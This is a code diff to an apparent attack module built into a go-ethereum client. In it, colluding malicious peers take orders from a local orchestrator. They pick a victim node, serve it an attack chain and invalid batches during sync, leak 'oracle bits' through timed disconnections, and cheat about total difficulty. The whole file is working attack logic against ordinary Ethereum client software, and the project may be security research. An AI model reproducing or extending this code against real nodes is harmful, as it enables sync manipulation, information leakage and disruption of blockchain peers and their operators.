@@ -5,7 +5,6 @@ import "math/big"
 import "time"
 import "sync"
 import "encoding/binary"
-//import "github.com/ethereum/go-ethereum/eth/protocols/eth"
 import "github.com/ethereum/go-ethereum/p2p"
 import "github.com/ethereum/go-ethereum/ethdb"
 import "github.com/ethereum/go-ethereum/core/types"
@@ -14,12 +13,10 @@ import "github.com/ethereum/go-ethereum/attack/utils"
 
 const (
 	ADDR = "localhost"
-	PORT = "45678"
 )
-
+var port string
 var conn net.Conn
 var incoming chan []byte
-//var outgoing chan byte
 var quitCh chan struct{}
 var attackPhase utils.AttackPhase
 var mustCheatAboutTd bool
@@ -30,15 +27,16 @@ var master bool
 var victim *p2p.Peer
 var victimID string
 var otherMaliciousPeers []string
-var enoughMaliciousPeers bool
 var mustChangeAttackChain bool
-var mustDisconnectVictim chan bool
-var readyToDisconnect chan bool
 var quitLock sync.Mutex
 var victimLock sync.Mutex
-var syncOpLock sync.Mutex
-var syncOpTerminated bool
+var canServePivoting chan bool
+var canDisconnect chan bool
 
+
+func SetOrchPort(p string) {
+	port = p
+}
 
 func Initialize(id string) error {
 	var err error
@@ -58,7 +56,7 @@ func Initialize(id string) error {
 		return err
 	}
 
-	conn, err = net.Dial("tcp", ADDR+":"+PORT)
+	conn, err = net.Dial("tcp", ADDR+":"+port)
 	if err != nil {
 		log("Could not connect to orchestrator")
 		log("err =", err)
@@ -78,9 +76,8 @@ func Initialize(id string) error {
 	numServedBatches = 0
 	dropped = make(chan bool)
 	master = false
-	enoughMaliciousPeers = false
-	mustDisconnectVictim = make(chan bool)
-	readyToDisconnect = make(chan bool)
+	canServePivoting = make(chan bool, 1)
+	canDisconnect = make(chan bool)
 
 	incoming = make(chan []byte)
 	go readLoop(conn, incoming, quitCh)
@@ -120,6 +117,8 @@ func SetVictimIfNone(v *p2p.Peer) {
 	}
 
 	victimLock.Lock()
+	// We want either to pick a new victim or get the p2p.Peer object of the one already picked.
+	// But we must avoid changing victim during the attack.
 	if victim == nil && (victimID == "" || victimID == vID) {
 		victim = v
 		victimID = vID
@@ -140,12 +139,14 @@ func SetVictimIfNone(v *p2p.Peer) {
 		}
 		log("Set victim:", vID)
 
-		// If a value was put into mustDisconnectVictim, but the victim never queried the last invalid batch
-		// during previous syncOp, we need to clear the channel to avoid incorrect behaviour later on.
+		// These two channels may remain full if the victim never sent the pivoting request
+		// during previous syncOp, or it did but we disconnected before serving it (when leaked bit is 0).
+		// Therefore, we clear them.
 		L:
 		for {
 			select {
-			case <-mustDisconnectVictim:
+			case <-canServePivoting:
+			case <-canDisconnect:
 			default:
 				break L
     		}
@@ -156,22 +157,8 @@ func SetVictimIfNone(v *p2p.Peer) {
 	victimLock.Unlock()
 }
 
-func NewPeerJoined(p *p2p.Peer) {
-	// After a drop because of an oracle query, the victim will eventually rejoin this peer's peerset
-	// When it happens, update the Peer object referencing the victim
 
-	// Ignoring for now as SetVictimIfNone() does the same thing, not when the victim rejoins but when
-	// it asks again for head and pivot
-	// Note: in this way, the non-master peer won't have a reference to the p2p victim. However it does
-	// not need to.
-
-	/*
-	if victimID == p.ID().String()[:8] {
-		victim = p
-	}
-	*/
-}
-
+/*
 func PeerDropped() {
 	select {
 	case <-quitCh:
@@ -180,6 +167,13 @@ func PeerDropped() {
 	default:
 		dropped <- true
 	}
+}
+*/
+
+// This function would be useful to set the victim's p2p.Peer object in the non-master peer.
+// However, the non-master peer doesn't need this object. So, the function does nothing for now.
+func NewPeerJoined(peer *p2p.Peer) {
+	return
 }
 
 func ServedBatchRequest(from uint64, peerID ...string) {
@@ -248,42 +242,31 @@ func ServedBatchRequest(from uint64, peerID ...string) {
 					log("Quitting")
 					return
 				}
-				victim.SetMustNotifyDrop(false)
 				timeout.Stop()
-				victimLock.Lock()
-				SendOracleBit(bit)
-				if bit == 1 {
-					if victim == nil {
-						log("Victim should not be nil here")
-					}
-					//mustDisconnectVictim <- true // It should be rather called 'mustProvideLastInvalidBatch'
-												 // Or 'mustForceVictimToDisconnect'
-					
-				} else {
-					//mustDisconnectVictim <- false
-					//TerminatingSyncOp()
-				}
 
-				// Since we disconnect, the Peer object referencing the victim cannot be use any longer
-				//<-readyToDisconnect
-				victim.Disconnect(p2p.DiscNetworkError)
-				victim = nil
+				victim.SetMustNotifyDrop(false)
+				canServePivoting <- true 		// Only after leaking the bit, we can proceed with the disconnection
+				SendOracleBit(bit)
+				victimLock.Lock()
+
+				if bit==1 {
+					<-canDisconnect				// When bit==0, we disconnect without waiting for serving the pivoting
+												// request. This is because the victim will already restart a new
+												// syncOp due to the invalid header it encountered.
+				}
+				victim.Disconnect(p2p.DiscUselessPeer)
+				victim = nil // Since we disconnect, the Peer object referencing the victim cannot be use any longer
 				master = false
 				servedBatches = make([]bool, numServedBatches) // Reset all values to false
 				numServedBatches = 0
 				log("Reset victim: victim =", victim, "&victim =", &victim)
-
-				syncOpLock.Lock()
-				syncOpTerminated = false
-				syncOpLock.Unlock()
-
 				victimLock.Unlock()
-
 			}()
 		}
 	}
 }
 
+/*
 func areAllBatchesServed() bool {
 	for _, served := range servedBatches {
 		if !served {
@@ -292,6 +275,7 @@ func areAllBatchesServed() bool {
 	}
 	return true
 }
+*/
 
 
 func GetAttackPhase() utils.AttackPhase {
@@ -365,7 +349,7 @@ func BatchExists(from uint64) bool {
 		fatal(utils.ParameterErr, "Error: passed batch does not start with a multiple of", utils.BatchSize)
 	}
 
-	if (from-1)/utils.BatchSize >= uint64(len(servedBatches)+1) { // Recall there exists one more batch (the invalid one)
+	if (from-1)/utils.BatchSize >= uint64(len(servedBatches)) {
 		return false
 	}
 	return true
@@ -393,16 +377,6 @@ func MustUseAttackChain() bool {
 	return false
 }
 
-/*
-func MustDisconnectVictim() bool {
-	if !master {
-		sendMessage(msg.SolicitMustDisconnectVictim)
-	}
-	result := <-mustDisconnectVictim
-	return result
-}
-*/
-
 
 func SendOracleBit(bit byte) {
 	err := sendMessage(msg.OracleBit.SetContent([]byte{bit}))
@@ -420,52 +394,6 @@ func LastPartialBatch(from uint64) bool {
 	return false
 }
 
-func LastInvalidBatch(from uint64) bool {
-	if (from-1)%utils.BatchSize == 0 && (from-1)/utils.BatchSize == uint64(len(servedBatches)) {
-		return true
-	}
-	return false
-}
-
-/*
-func TerminatingSyncOp() {
-	if !master {
-		return
-	}
-
-	syncOpLock.Lock()
-	if !syncOpTerminated {
-		log("SyncOp terminated")
-		syncOpTerminated = true
-		syncOpLock.Unlock()
-		go func() {
-			timeout := time.NewTimer(3*time.Second)
-			<-timeout.C
-			//log("readyToDisconnect populated")
-			//readyToDisconnect <- true
-		}()
-	} else {
-		syncOpLock.Unlock()
-	}
-}
-*/
-
-/*
-func MustSkipLastInvalidBatch(form uint64) bool {
-	if !((from-1)%utils.BatchSize == 0 && (from-1)/utils.BatchSize == uint64(len(servedBatches))) {
-		// This is not the last invalid batch, so fulfil the request as normal
-		return false
-	}
-
-	// If we are here, then this is the last invalid batch.
-	// We skip it only if the master peer didn't ask to disconnect the victim
-	if master {
-		return !mustDisconnectVictim
-	} else {
-		waitForMaster()
-	}
-}
-*/
 
 func Latest() *types.Header {
 	chainType := attackPhase.ToChainType()
@@ -487,6 +415,20 @@ func IsVictim(id string) bool {
 
 func DelayBeforeServingBatch() {
 	time.Sleep(3*time.Second)
+}
+
+func WaitBeforePivoting() {
+	timeout := time.NewTimer(10*time.Second)
+	select {
+	case <-canServePivoting:
+		timeout.Stop()
+	case <-timeout.C:			// Avoiding the eth/handlers to stall forever (this should happen hardly ever btw)
+		log("Odd case happened: pivoting request arrived after peer re-election as master")
+	}
+}
+
+func PivotingServed() {
+	canDisconnect <- true
 }
 
 
@@ -556,6 +498,7 @@ func handleMessages() {
 						mustChangeAttackChain = true
 					}
 				}
+			/*
 			case msg.MustDisconnectVictim.Code:
 				switch message.Content[0] {
 				case 0:
@@ -563,6 +506,7 @@ func handleMessages() {
 				case 1:
 					mustDisconnectVictim <- true
 				}
+
 			case msg.SolicitMustDisconnectVictim.Code:
 				go func() {
 					if master {
@@ -572,9 +516,9 @@ func handleMessages() {
 							content = byte(1)
 						}
 						sendMessage(msg.MustDisconnectVictim.SetContent([]byte{content}))
-						//TerminatingSyncOp()
 					}
 				}()
+			*/
 			case msg.Terminate.Code:
 				Close()
 			}
